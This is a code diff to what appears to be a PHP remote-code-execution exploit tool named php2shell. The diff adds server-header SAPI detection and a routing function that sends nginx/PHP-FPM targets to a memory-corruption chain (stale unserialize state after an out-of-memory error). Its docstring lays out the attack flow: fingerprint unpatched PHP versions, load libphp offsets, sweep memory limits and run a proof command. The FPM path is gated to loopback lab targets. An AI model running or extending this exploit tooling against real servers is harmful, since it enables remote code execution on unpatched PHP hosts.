@@ -7,11 +7,14 @@ Flow
 ----
 1. Fingerprint the target (X-Powered-By, Server, PHP version in the body).
 2. Reject versions at or above the fixed release.
-3. Compare the target OS with the profile (Debian/Ubuntu/Fedora/Alpine...).
-4. Load the verified build profile and take the libphp offsets and heap
+3. Route by SAPI: nginx (PHP-FPM) targets go to the FPM chain
+   (tools/php2shell_fpm.py, local lab / oracle mode); Apache targets
+   continue with the upstream progress-cache chain.
+4. Compare the target OS with the profile (Debian/Ubuntu/Fedora/Alpine...).
+5. Load the verified build profile and take the libphp offsets and heap
    parameters from it.
-5. Run the chain, sweeping typical memory limits unless one is supplied.
-6. Print a Wiz-style staged log and a result box.
+6. Run the chain, sweeping typical memory limits unless one is supplied.
+7. Print a Wiz-style staged log and a result box.
 
 Proof handling is automatic:
   - local target: read the proof file written to the mounted /out;
@@ -34,7 +37,6 @@ import re
 import socket
 import ssl
 import subprocess
-import threading
 import time
 import sys
 import urllib.parse
@@ -122,6 +124,71 @@ def classify(version: str):
     branch = f"{major}.{minor}"
     fixed = FIXED.get(branch)
     return branch, fixed, (patch >= fixed if fixed else None)
+
+
+def detect_sapi(server: str) -> str:
+    """Best-effort SAPI guess from the Server header: nginx in front of
+    PHP-FPM is the common non-Apache shape."""
+    text = (server or "").lower()
+    if "apache" in text:
+        return "apache"
+    if "nginx" in text:
+        return "fpm"
+    return "unknown"
+
+
+def proof_path_from_command(command: str, default: str = "out/p1") -> str:
+    if ">" in command:
+        tail = command.rsplit(">", 1)[1].strip()
+        if tail:
+            return tail.lstrip("/")
+    return default
+
+
+def run_fpm_chain(ui, args, version: str) -> int:
+    """Route an nginx+PHP-FPM target to tools/php2shell_fpm.py.
+
+    The FPM chain (stale BG(unserialize) after a post-RINIT OOM) currently
+    calibrates the reclaim geometry through the local /proc oracle, so it
+    only runs against loopback lab targets.  Remote FPM exploitation needs
+    a leak primitive and is future work."""
+    import php2shell_fpm as fpm
+
+    host = urllib.parse.urlsplit(
+        args.target if "://" in args.target else "http://" + args.target
+    ).hostname or ""
+    if not is_loopback(host):
+        ui.crit("the FPM chain needs local /proc oracle access (lab mode)")
+        ui.info("remote FPM exploitation requires a leak primitive (future work)")
+        ui.result(False, "FPM REMOTE UNSUPPORTED", f"PHP {version} behind a non-loopback front")
+        return 3
+
+    base = args.target if "://" in args.target else "http://" + args.target
+    builder = args.builder or base
+    # the auto defaults (id>/out/p1) target the Apache chain's mounted /out;
+    # the FPM chain runs with the pool chdir as cwd and writes relative paths
+    command = args.command
+    if command in ("id>/out/p1", "id>p1"):
+        command = "id>out/p1"
+    proof_file = args.proof_file or proof_path_from_command(command)
+
+    ui.stage("FPM CHAIN", f"PHP {version} via {base}")
+    ui.info(f"builder: {builder}")
+    ui.info(f"command: {command}  (worker cwd = pool chdir)")
+    ui.info("calibration oracle: /proc/<worker>/mem (local lab)")
+
+    ns = argparse.Namespace(
+        base=base,
+        builder=builder,
+        version=version,
+        command=command,
+        proof_file=proof_file,
+        size=4 << 20,
+    )
+    rc = fpm.cmd_endgame(ns)
+    ui.result(rc == 0, "RCE" if rc == 0 else "FAILED",
+              f"PHP {version} fpm chain" if rc == 0 else "no proof file")
+    return rc
 
 
 def is_loopback(host: str) -> bool:
@@ -559,6 +626,10 @@ def main() -> int:
                     help="CPU architecture; required for remote targets, auto-detected locally")
     ap.add_argument("--profile", default=None,
                     help="force a profile by name/path substring (needed when a version has several builds)")
+    ap.add_argument("--sapi", choices=("auto", "apache", "fpm"), default="auto",
+                    help="override the SAPI detection (fpm = nginx + PHP-FPM chain)")
+    ap.add_argument("--builder", default=None,
+                    help="FPM chain builder endpoint (default: the target itself)")
     ap.add_argument("--no-color", action="store_true")
     args = ap.parse_args()
 
@@ -637,6 +708,11 @@ def main() -> int:
         return 0
     if fixed is None:
         ui.warn(f"branch {branch} is outside the fix matrix (EOL/unpatched)")
+
+    sapi = args.sapi if args.sapi != "auto" else detect_sapi(server)
+    if sapi == "fpm":
+        ui.info(f"SAPI: fpm (server header {server!r}); using the FPM chain")
+        return run_fpm_chain(ui, args, version)
 
     if args.profile:
         matches = [p for p in profiles
